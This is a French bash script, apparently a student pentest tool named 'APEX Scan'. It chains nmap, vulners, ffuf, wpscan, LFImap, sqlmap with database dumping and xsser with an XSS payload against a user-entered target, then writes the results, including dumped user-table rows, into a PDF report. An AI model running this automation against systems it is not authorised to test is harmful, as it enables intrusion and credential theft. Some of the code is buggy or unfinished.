#!/bin/bash
#author : R. Batelier & C.Liottard
#version : beta 1.0
#date maj: 20 / 06 / 2023

clear

# Variables

date=$(date '+%d/%m/%Y') # date du jour
version="beta-v0.3" # version du fichier

echo -e "\033[1m+-----------------------------------------------------------+\033[0m"
echo -e "\033[1m|        .o.        ooooooooo.    oooooooooo  oooo    oooo  |\033[0m"
echo -e "\033[1m|       .888.        888    Y88.   88      8    88.   88    |\033[0m"
echo -e "\033[1m|      .8^888.       888   .d88    88            88L.88     |\033[0m"
echo -e "\033[1m|     .8   888.      888ooo88P     88888          888       |\033[0m"
echo -e "\033[1m|    .88ooo8888.     888           88      .      8^88      |\033[0m"
echo -e "\033[1m|   .8       888.    888          .88     .o   .88   88 .   |\033[0m"
echo -e "\033[1m|  o88o     o8888o  o888o         oooooooo88  ooo     oooo  |\033[0m"
echo -e "\033[1m+-----------------------------------------------------------+\033[0m"
echo ""
read -p "IP ou URL à attaquer : " ip # Variable IP dans une variable
echo ""
read -p "Est-ce bien la cible $ip ? (y/n) - " rep

if [ "$rep" = "y" ]; then  # Confirmation de l'IP
  echo ""
  sleep 1
else
  echo "Arrêt."
  exit
fi

if [[ "$ip" = "apex.boutique" || "$ip" = "apexscan.000webhostapp.com" ]]; then
  ip1="https://apexscan.000webhostapp.com/"
  ip2="https://apexscan.000webhostapp.com/article.php?file=PWN"
elif [ "$ip" = "192.168.5.129" ]; then
  ip1="http://192.168.5.129/photo_gallery/login.php"
  ip2="http://192.168.5.129/docs/view.php?file=PWN"
else
  ip1=$ip
  ip2=$ip
fi

echo "Lancement d'APEX Scan"
echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter NMAP et rediriger la sortie vers un fichier temporaire
echo "			    NMAP"
nmap -sS -sV -T4 -p 80,443 "$ip" > rapport_nmap_temp.txt # -sS (TCP SYN); -sV (service/version du port); -T4 (agressivité/vitesse); -p (port 80 et 443) de l'IP donné

ip_nmap=$(grep -oE "([0-9]{1,3}[.]){3}[0-9]{1,3}" | head -n 1 rapport_nmap_temp.txt) # note l'IP que NMAP récupère
admac_nmap=$(grep "MAC Address:" rapport_nmap_temp.txt) # note l'adresse mac que NMAP récupère
time_nmap=$(tail -n1 rapport_nmap_temp.txt | grep -oE "([0-9]{1,2}[.])[0-9]{1,2}") # La durée du NMAP
tab_nmap=$(grep -E "^[0-9]+/tcp\s+open\s+.+" rapport_nmap_temp.txt | awk '/^[0-9]/ {print "<tr><td>" $1 "</td><td>" $3 "</td><td>" $4; for(i=5; i<=NF; i++) printf(" %s", $i); printf("</td></tr>\n") }') # Tableau NMAP (Port / Service / Version)

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter VULNERS et rediriger la sortie vers un fichier temporaire
echo "			   VULNERS"
nmap -sV --script vulners "$ip" > rapport_vulners_temp.txt

vulners=$(awk '/*EXPLOIT*/ {
if ($3 >= 9) 
{
  $NF="";
  $1=""; 
  print "CVE: " $2 "</br>"; 
  print "Score CVSS: <span style=\"color:red\">" $3 "</span></br>"; 
  print "Voir plus: " $4 "</br>"; print "</br>";
}
else if ($3 < 9 && $3 >= 7)
{
  $NF="";
  $1=""; 
  print "CVE: " $2 "</br>"; 
  print "Score CVSS: <span style=\"color:orange\">" $3 "</span></br>"; 
  print "Voir plus: " $4 "</br>"; print "</br>";
}
else if ($3 < 7 && $3 >= 4)
{
  $NF="";
  $1=""; 
  print "CVE: " $2 "</br>"; 
  print "Score CVSS: <span style=\"color:yellow\">" $3 "</span></br>"; 
  print "Voir plus: " $4 "</br>"; print "</br>";
}
else 
{
  $NF="";
  $1=""; 
  print "CVE: " $2 "</br>"; 
  print "Score CVSS: <span style=\"color:green\">" $3 "</span></br>"; 
  print "Voir plus: " $4 "</br>"; print "</br>";
}
}' rapport_vulners_temp.txt)

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter FUFF et rediriger la sortie vers un fichier temporaire
echo "			    FUFF"
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/FUZZ > rapport_fuff_temp.txt # -recursion https://apexscan.000webhostapp.com

fuffp1=$(grep "FUZZ: " rapport_fuff_temp.txt | grep -v -e "FUZZ: #" | grep '[a-z]' | awk -v ip=$ip '{print "http://" ip "/" $NF "</br>"}')

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter WPSCAN et rediriger la sortie vers un fichier temporaire
echo "			   WPSCAN"
wpscan --url "$ip" -o rapport_wpscan_temp.txt
wpscanok=$(grep "Scan Aborted" rapport_wpscan_temp.txt)
wpscanon="Scan Aborted: The remote website is up, but does not seem to be running WordPress."
if [ "$wpscanok" = "$wpscanon" ]; then
  wpscan="Le site n'est pas un WordPress."
else
  wpscan="Scan: "
fi

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter NSLOOKUP et rediriger la sortie vers un fichier temporaire
echo "			  NSLOOKUP"
nslookup "$ip" > rapport_nslookup_temp.txt

dns_nslookup=$(grep "name =" rapport_nslookup_temp.txt | awk '{print $NF}')

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter LFIMAP et rediriger la sortie vers un fichier temporaire
echo "			   LFIMAP"
python3 LFImap/lfimap.py -U $ip2 -a --log rapport_lfimap_temp.txt # https://apexscan.000webhostapp.com/article.php?file=PWN / http://"$ip"/docs/view.php?file=PWN

lfi=$(grep -o "LFI -> '[^']*'" LFImap/rapport_lfimap_temp.txt | head -n 1 | awk '{print $1}')

if [ "$lfi" = "LFI" ]; then
  lfip1="Le site contient une LFI:</br>Les failles LFI ou local File Inclusion sont des ...</br></br>Traces:";
  lfip2=$(grep -o "LFI -> '[^']*'" LFImap/rapport_lfimap_temp.txt | awk '{print "<p style=\"font-size:12px\">"$1 " " $2 " " $3 "</p>"}');
else
  lfi1="Le site ne contient pas de LFI.";
fi

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter SQLMAP et rediriger la sortie vers un fichier temporaire
echo "			   SQLMAP"
sqlmap -u $ip1 --batch --forms --dump --crawl=2 > rapport_sqlmap_temp.txt # https://apexscan.000webhostapp.com <---> 192.168.5.129(TP Hacking 1)http://$ip/photo_gallery/login.php

sql=$(grep -o "SQL injection vulnerability has already been detected" rapport_sqlmap_temp.txt)

if [ "$sql" = "SQL injection vulnerability has already been detected" ]; then
  sqlp1="Le site contient une SQLi:</br>Les injections SQL sont ...</br></br>Traces:";
  sqli1=$(grep "entries]" rapport_sqlmap_temp.txt | head -n 1 | awk '/\[.* entries\]/{num = substr($0, 2, 1); print num + num}');
  sqli=$(grep -A $sqli1 "Table: users" rapport_sqlmap_temp.txt | sed '1d;2d;3d;5d;11d;12d;13d' | awk '{print "<tr><td>" $4 "</td><td>" $6 "</td></tr>"}'); # sed(retirer la ligne 1,2,3,5,11,12,13) ; awk(écrire le 4ème et 6ème mot) 
else
  sqlp1="Le site ne contient pas de faille SQLi.";
fi

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter XSSER et rediriger la sortie vers un fichier temporaire
echo "			    XSSER"
xsser -u $ip1 -g '/xss.php?file=XSS' --payload="<script>alert('XSS')</script>" > rapport_xsser_temp.txt # https://apexscan.000webhostapp.com

xss=$(grep -o "CONGRATULATIONS: You have found: " rapport_xsser_temp.txt)
xss1=$(grep "Payload" rapport_xsser_temp.txt | awk '{print $3}')

if [ "$xss" = "CONGRATULATIONS: You have found: " ]; then
  xssp1="Le site contient une faille XSS:</br>Les failles XSS sont ...</br></br>Traces:";
  xssp2="<p style=\"font-size:12px\">"$xss1"</p>";
else
  xssp1="Le site ne contient pas de faille XSS";
fi

echo ""
echo "+-----------------------------------------------------------+"
echo ""

# Exécuter IDOR et rediriger la sortie vers un fichier temporaire
echo "			    IDOR"


echo ""
echo "+-----------------------------------------------------------+"
echo ""
echo "Fin d'APEX Scan"

# Convertir le fichier temporaire en HTML en utilisant un modèle HTML personnalisé
cat <<EOF > rapport_html_temp.html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Rapport APEX Scan</title>
  <style>
    body {
      font-family: sans-serif;
    }
    h1 {
      font-size: 25px;
      margin-bottom: 10px;
      font-family: "Pattanakarn";
    }
    h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }
    h3 {
      font-size: 15px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      margin-bottom: 20px;
    }
    th, td {
      border: 1px solid #ddd;
      padding: 8px;
      text-align: left;
      font-size: 12px;
    }
    th {
      background-color: #f2f2f2;
    }
    img {
      width: 85%;
      height: auto;
      display: block;
      margin: auto;
    }
    @font-face {
      font-family: "Pattanakarn";
      src: url("Fonts.ttf");
    }
    .titre
      {color: darkgreen}
  </style>
</head>
<body>

  <center>
     <b><p style="color:red">CONFIDENTIEL - NE PAS DIFFUSER</p></b>
     </br></br></br></br></br>
     <img src="APEX1.png" alt="LOGO APEX"/>
     <h1 style="color:#1863c2";>Rapport du Scan</h1>
     <h2 style="color:#1863c2;font-family: Pattanakarn";>Cible: $ip</h2>
     </br></br></br></br></br></br></br></br></br></br></br></br></br></br>
     <p>Date: $date - Version: $version</p>
  </center>
  
  <h2>Information de la machine cible:</h2>
  <p>IP Address: $ip_nmap</p>
  <p>$admac_nmap</p>
  <p>DNS: $dns_nslookup</p>
  
  <h2>Nmap</h2>
  <h3>Le temps du scan:</h3>
  <p>Durée du Nmap: $time_nmap secondes</p>
  <h3>Résultat du scan (port ouvert/filtré):</h3>
  <table>
    <thead>
      <tr>
        <th>Port</th>
        <th>Service</th>
        <th>Version</th>
      </tr>
    </thead>
    <tbody>
    <p>$tab_nmap</p>
  </tbody>
  </table>
  
  <h3>FUFF:</h3>
  <p>$fuffp1</p>
  
  <h3>LFI:</h3>
  <p>$lfip1</br>$lfip2</p>
  
  <h3>SQLI:</h3>
  <p>$sqlp1</p>
  <table>
    <tbody>
      <p>$sqli</p>
    </tbody>
  </table>
  
  <h3>XSS:</h3>
  <p>$xssp1 $xssp2</p>
  
  <h3>IDOR:</h3>
  <p>En développement..</p>
  
  <h3>Exploits:</h3>
  <p>$vulners</p>
  
  <h2>Wpscan</h2>
  <p>$wpscan</p>
  
  <h2>Remédiations</h2>
  <p></p>
  
</body>
</html>
EOF

# Convertir le fichier HTML en PDF avec WeasyPrint
weasyprint rapport_html_temp.html rapport_apex.pdf

# Supprimer les fichiers temporaires
rm rapport_nmap_temp.txt rapport_wpscan_temp.txt rapport_html_temp.html rapport_nslookup_temp.txt rapport_fuff_temp.txt rapport_lfimap_temp.txt rapport_vulners_temp.txt LFImap/rapport_lfimap_temp.txt rapport_sqlmap_temp.txt rapport_xsser_temp.txt